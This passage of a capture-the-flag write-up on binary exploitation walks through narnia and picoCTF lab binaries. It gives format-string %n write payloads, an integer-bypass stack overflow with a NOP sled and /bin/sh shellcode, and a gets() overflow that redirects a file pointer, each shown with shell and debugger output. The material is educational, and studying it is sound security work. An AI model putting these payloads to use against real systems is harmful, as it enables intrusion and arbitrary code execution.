<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia7@melinda:/narnia$ ltrace ./narnia7 `python -c 'print "AAAA" + ".%08x"*7'`
</span><span class='line'>__libc_start_main(0x804868f, 2, 0xffffd764, 0x8048740 &lt;unfinished ...&gt;
</span><span class='line'>memset(0xffffd620, '\0', 128)                                                                                          = 0xffffd620
</span><span class='line'>printf("goodfunction() = %p\n", 0x80486e0goodfunction() = 0x80486e0
</span><span class='line'>)                                                                             = 27
</span><span class='line'>
</span><span class='line'>)                                                                         = 30
</span><span class='line'>printf("before : ptrf() = %p (%p)\n", 0x80486e0, 0xffffd61cbefore : ptrf() = 0x80486e0 (0xffffd61c)
</span><span class='line'>)                                                           = 41
</span><span class='line'>puts("I guess you want to come to the "...I guess you want to come to the hackedfunction...
</span><span class='line'>printf("hackedfunction() = %p\n\n", 0x8048706hackedfunction() = 0x8048706
</span><span class='line'>)                                                                            = 50
</span><span class='line'>sleep(2)                                                                                                               = 0
</span><span class='line'>snprintf("AAAA.08048238.ffffd678.f7ffda94."..., 128, "AAAA.%08x.%08x.%08x.%08x.%08x.%0"..., 0x8048238, 0xffffd678, 0xf7ffda94, 0, 0x80486e0, 0x41414141, 0x3038302e) = 67
</span><span class='line'>puts("Welcome to the goodfunction, but"...Welcome to the goodfunction, but i said the Hackedfunction..
</span><span class='line'>)                                                                            = 61
</span><span class='line'>fflush(0xf7fcaac0)                                                                                                     = 0
</span><span class='line'>exit(0 &lt;no return ...&gt;
</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>
If you see 0x41414141 is at offset 6.

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ p ptrf
</span><span class='line'>$3 = (int (*)()) 0x804871f &lt;goodfunction&gt;
</span><span class='line'>gdb-peda$ p &ptrf
</span><span class='line'>$4 = (int (**)()) 0xffffd2ec
</span><span class='line'>gdb-peda$ x /10xb 0xfffd3ea
</span><span class='line'>0xfffd3ea:    Cannot access memory at address 0xfffd3ea
</span><span class='line'>gdb-peda$ x /10xb 0xffffd3ea
</span><span class='line'>0xffffd3ea:   0x3f    0x77    0x00    0x00    0x00    0x00    0x00    0x00
</span><span class='line'>0xffffd3f2:   0x00    0x00
</span><span class='line'>gdb-peda$ x /10xb 0xffffd2ea
</span><span class='line'>0xffffd2ea:   0x04    0x08    0x1f    0x87    0x04    0x08    0x41    0x41
</span><span class='line'>0xffffd2f2:   0x41    0x41
</span><span class='line'>gdb-peda$ p goodfunction 
</span><span class='line'>$5 = {int ()} 0x804871f &lt;goodfunction&gt;
</span><span class='line'>gdb-peda$ p ha
</span><span class='line'>hackedfunction  hasmntopt       
</span><span class='line'>gdb-peda$ p hackedfunction 
</span><span class='line'>$6 = {int ()} 0x8048745 &lt;hackedfunction&gt;</span></code></pre></td></tr></table></div></figure>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ p &ptrf 
</span><span class='line'>$10 = (int (**)()) 0xffffd2fc
</span><span class='line'>gdb-peda$ run `python -c 'print "\xfc\xd2\xff\xff" + ".%08x"*5 + "%hhn"'`
</span><span class='line'>gdb-peda$ p ptrf 
</span><span class='line'>$12 = (int (*)()) 0x8048731 &lt;goodfunction+18&gt;
</span><span class='line'>gdb-peda$ x /10xb 0xffffd2fa
</span><span class='line'>0xffffd2fa:   0x04    0x08    0x31    0x87    0x04    0x08    0xfc    0xd2
</span><span class='line'>0xffffd302:   0xff    0xff
</span></code></pre></td></tr></table></div></figure>

</li>

<li>
In the below code, if we can somehow set the value of secret to 1337, we can get a shell on the system to read the flag. Also, the printf function directly prints the argument whatever is passed by the user. By concepts above, we need to find the address of secret and write to it. Address of the secret can be found by gdb or objdump. Either the address would be already present on stack or it can be put on stack.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="n">secret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">give_shell</span><span class="p">(){</span>
</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh -i&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">secret</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">secret</span> <span class="o">==</span> <span class="mi">1337</span><span class="p">){</span>
</span><span class='line'>        <span class="n">give_shell</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

Reading the address
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pico83515@shell:/home/format$ gdb -q format
</span><span class='line'>Reading symbols from format...(no debugging symbols found)...done.
</span><span class='line'>(gdb) p $secret
</span><span class='line'>$1 = void
</span><span class='line'>(gdb) p &secret
</span><span class='line'>$2 = (&lt;data variable, no debug info&gt; *) 0x804a030 &lt;secret&gt;</span></code></pre></td></tr></table></div></figure>
Now we have to find whether is this address present on the stack? If not, we can put this address on the stack because of the format string vulnerability.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pico83515@shell:/home/format$ ./format %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
</span><span class='line'>ffffd774.ffffd780.f7e4f39d.f7fc83c4.f7ffd000.0804852b.0804a030.08048520.00000000</span></code></pre></td></tr></table></div></figure>
We see that the address is present on the stack at the seventh position.

Otherwise, we can put it on the stack by
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x;echo ;done | grep 4141</span></code></pre></td></tr></table></div></figure>
What this is doing is &#8220;Extracting particular stack content by &#8220;%$i\$x&#8221;. As we have seen in DMA, $x can be used to extract particular stack content and reading it. $i value changes from 1-256. However, as you add more data, the offset of your original input changes, so go ahead and add 1333 more bytes of data and see what the offset is then. (1337 is what we want to put into secret, and we will have written four bytes (AAAA), so 1333+4 = 1337)
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>or i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x%1333u;echo ;done | grep 4141
</span><span class='line'>Offset: 103:AAAA41410074
</span><span class='line'>Offset: 104:AAAA31254141</span></code></pre></td></tr></table></div></figure>
So we found our A’s again, but they aren’t aligned on the stack. Lets add two more A’s at the end to see if we can get it to line up.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x%1333uAA;echo ;done | grep 41414141
</span><span class='line'>Offset: 103:AAAA41414141</span></code></pre></td></tr></table></div></figure>
It looks like the address 0x0804a030 is getting placed in *ptr. That’s the address we need to use in place of our A’s. In order to place the number 1337 into secret’s memory address, we need to use the %n modifier. (%103$n will look at the data located at offset 103 as a memory address, and write the total number of bytes we have written so far into that address.)
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pico1139@shell:/home/format$ env -i ./format $(python -c 'print "\x30\xa0\x04\x08"+"%1333u%103$nAA"')
</span><span class='line'>$ id
</span><span class='line'>uid=11066(pico1139) gid=1008(format) groups=1017(picogroup)
</span><span class='line'>$ ls
</span><span class='line'>Makefile  flag.txt  format  format.c
</span><span class='line'>$ cat flag.txt
</span><span class='line'>who_thought_%n_was_a_good_idea?</span></code></pre></td></tr></table></div></figure>
Otherwise as the address at the seventh is already present on stack we can also do
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pico83515@shell:/home/format$ ./format "%1337u%7\$n"</span></code></pre></td></tr></table></div></figure>
We used DMA to access the memory, so written 1337 directly at the address pointed by the 7th position. Otherwise, we can use the basic 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./format %08x.%08x.%08x.%08x.%08x.%1292u%n</span></code></pre></td></tr></table></div></figure>
If you see, we did 5 stack pop-up by using %08x, written the value to be written at 6th position and 7th position contains the address of secret. If you further see &#8220;%08x.&#8221; is of eight characters + 1 of &#8220;.&#8221; or 9 bytes, used five times i.e 9*5=45 bytes and 1292+45 == 1337.

</li>

<li>
In another example below,
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define BUFSIZE 256</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">greet</span><span class="p">(</span><span class="kt">int</span> <span class="n">length</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUFSIZE</span><span class="p">];</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;What is your name?&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello, %s</span><span class="se">\n</span><span class="s">!&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">be_nice_to_people</span><span class="p">(){</span>
</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
</span><span class='line'>    <span class="n">be_nice_to_people</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;How long is your name?&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">length</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">length</span> <span class="o">&lt;</span> <span class="n">BUFSIZE</span><span class="p">)</span> <span class="c1">//don&#39;t allow buffer overflow</span>
</span><span class='line'>        <span class="n">greet</span><span class="p">(</span><span class="n">length</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Length was too long!&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
This program tries to prevent buffer overflows by first asking for the input length. It disregards the rest of the ouput. However, the program uses scanf. If we supply -1 as the length, we can bypass the overflow check: readelf -l no_overflow can be used to find if there&#8217;s any protection on the binary. Stack is executable, Furthermore, ASLR is not enabled. This makes it easy to stick in a shellcode plus a NOP sled and return to an address on the stack
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">no_overflow</span><span class="err">$</span> <span class="p">(</span><span class="n">echo</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">268</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\xd0\xd6\xff\xff</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">200</span><span class="o">+</span><span class="s">&quot; &quot;</span><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">xc9</span><span class="err">\</span><span class="n">xf7</span><span class="err">\</span><span class="n">xe1</span><span class="err">\</span><span class="n">x51</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x73</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x69</span><span class="err">\</span><span class="n">x6e</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe3</span><span class="err">\</span><span class="n">xb0</span><span class="err">\</span><span class="n">x0b</span><span class="err">\</span><span class="n">xcd</span><span class="err">\</span><span class="n">x80</span><span class="s">&quot;&#39;; cat) | ./no_overflow</span>
</span><span class='line'><span class="n">How</span> <span class="kt">long</span> <span class="n">is</span> <span class="n">your</span> <span class="n">name</span><span class="o">?</span>
</span><span class='line'><span class="n">What</span> <span class="n">is</span> <span class="n">your</span> <span class="n">name</span><span class="o">?</span>
</span><span class='line'><span class="n">Hello</span><span class="p">,</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAA</span><span class="p">...</span><span class="n">snip</span><span class="p">...</span>
</span><span class='line'>
</span><span class='line'><span class="n">id</span>
</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">11066</span><span class="p">(</span><span class="n">pico1139</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1007</span><span class="p">(</span><span class="n">no_overflow</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1017</span><span class="p">(</span><span class="n">picogroup</span><span class="p">)</span>
</span><span class='line'><span class="n">cat</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</span><span class='line'><span class="n">what_is_your_sign</span>
</span></code></pre></td></tr></table></div></figure>
</li>

<li>
In an another example where stack is not executable, If you read the code, you would find, we need to change the file_name from not_the_flag.txt to flag.txt. In this example, they provided the address of the string &#8220;not_the_flag.txt&#8221; as 0x08048777. By putting a break point in puts in gdb and looking for the address of flag.txt.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) br *puts
</span><span class='line'>Breakpoint 1 at 0x8048460
</span><span class='line'>(gdb) run
</span><span class='line'>Starting program: /home/what_the_flag/what_the_flag 
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0xf7e81ee0 in puts () from /lib/i386-linux-gnu/libc.so.6
</span><span class='line'>(gdb) x/s 0x08048777
</span><span class='line'>0x8048777:    "not_the_flag.txt"
</span><span class='line'>(gdb) x/s 0x08048778
</span><span class='line'>0x8048778:    "ot_the_flag.txt"
</span><span class='line'>(gdb) x/s 0x08048770
</span><span class='line'>0x8048770:    "le: %s"
</span><span class='line'>(gdb) x/s 0x0804877C
</span><span class='line'>0x804877c:    "he_flag.txt"
</span><span class='line'>(gdb) x/s 0x0804877D
</span><span class='line'>0x804877d:    "e_flag.txt"
</span><span class='line'>(gdb) x/s 0x0804877E
</span><span class='line'>0x804877e:    "_flag.txt"
</span><span class='line'>(gdb) x/s 0x0804877F
</span><span class='line'>0x804877f:    "flag.txt"
</span></code></pre></td></tr></table></div></figure>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">message_data</span><span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">message</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">file_name</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">read_file</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file_path</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">FILE</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">file</span><span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)){</span>
</span><span class='line'>        <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
</span><span class='line'>        <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span><span class='line'>        <span class="n">sprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&quot;Cannot read file: %s&quot;</span><span class="p">,</span> <span class="n">file_path</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">message_data</span> <span class="n">data</span><span class="p">;</span>
</span><span class='line'>    <span class="n">data</span><span class="p">.</span><span class="n">file_name</span> <span class="o">=</span> <span class="s">&quot;not_the_flag.txt&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Enter your password too see the message:&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">gets</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">password</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">password</span><span class="p">,</span> <span class="s">&quot;1337_P455W0RD&quot;</span><span class="p">)){</span>
</span><span class='line'>        <span class="n">read_file</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">message</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="n">file_name</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">message</span><span class="p">));</span>
</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">message</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Incorrect password!&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

So we’ll ovewrite the file pointer with 0x804877f to make it read flag.txt. From gets()’s manual:

gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte (‘\0’). No check for buffer overrun is performed (see BUGS below).

So by using the following input, we can overwrite the file pointer and still provide the correct password:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>1337_P455W0RD
</span><span class='line'>1337_P455W0RD\0aa\x7f\x87\x04\x08
</span><span class='line'>aa\x7f\x87\x04\x08</span></code></pre></td></tr></table></div></figure>
We use this in the command line to get the flag
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pico83515@shell:/home/what_the_flag$ printf "1337_P455W0RD\0bb\x7f\x87\x04\x08" | ./what_the_flag
</span><span class='line'>Enter your password too see the message:
</span><span class='line'>Congratulations! Here is the flag: who_needs_%eip
</span><span class='line'>
</span><span class='line'>pico83515@shell:/home/what_the_flag$</span></code></pre></td></tr></table></div></figure>
</li>
</ol>

</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Vijay Kumar</span></span>

      




<time class='entry-date' datetime='2014-11-09T20:42:01+00:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>8:42 pm</span></time>
      


    </p>
    
      <div class="sharing">
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2014/11/07/learning-from-ctf-forensics/" title="Previous Post: Learning from CTF : Forensics">&laquo; Learning from CTF : Forensics</a>
      
      
        <a class="basic-alignment right" href="/blog/2015/01/02/learning-from-ctf-reverse-engineering/" title="Next Post: Learning from CTF : Reverse Engineering">Learning from CTF : Reverse Engineering &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/01/02/learning-from-ctf-reverse-engineering/">Learning From CTF : Reverse Engineering</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/09/learning-from-ctf-binary-exploitation/">Learning From CTF : Binary Exploitation</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/07/learning-from-ctf-forensics/">Learning From CTF : Forensics</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/07/learning-from-ctf-cryptography/">Learning From CTF : Cryptography</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/06/learning-from-ctf-web-exploitation/">Learning From CTF : Web Exploitation</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
